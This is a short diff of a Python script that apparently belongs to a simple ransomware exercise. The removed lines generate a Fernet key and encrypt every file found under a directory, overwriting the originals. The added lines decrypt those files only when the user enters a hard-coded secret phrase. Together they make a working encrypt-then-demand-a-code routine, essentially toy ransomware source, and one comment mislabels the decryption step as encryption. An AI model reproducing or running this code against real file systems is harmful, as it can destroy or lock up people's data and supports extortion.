@@ -25,18 +25,23 @@ def find_files_recursively(directory):
 # Start the search
 find_files_recursively(start_directory)
 
-key = Fernet.generate_key()
+# Recuperation of the key
+with open("thekey.key", "rb") as key:
+    secretkey = key.read()
 
-# with permet de gérer les erreurs et notamment de fermet les ressources
-# il suffit de définir __enter__ exit__ dans une classe
-with open("thekey.key", "wb") as thekey: # Create a file and open it to write in binary
-    thekey.write(key)
 
-for file in files:
-    with open(file, "rb") as thefile:
-        contents = thefile.read() # take the contents
-    contents_encrypted = Fernet(key).encrypt(contents) # encrypt the contents
-    
-    # open another time the file to write on the previous data
-    with open(file, "wb") as thefile: 
-        thefile.write(contents_encrypted)
+secretcode = "simple"
+
+user_phrase = input("Enter the secret code to decrypt your file\n")
+
+if user_phrase == secretcode:
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read() # take the contents
+        contents_decrypted = Fernet(secretkey).decrypt(contents) # encrypt the contents
+        
+        # open another time the file to write on the previous data
+        with open(file, "wb") as thefile: 
+            thefile.write(contents_decrypted)
+else:
+    print("wrong secret phrase")
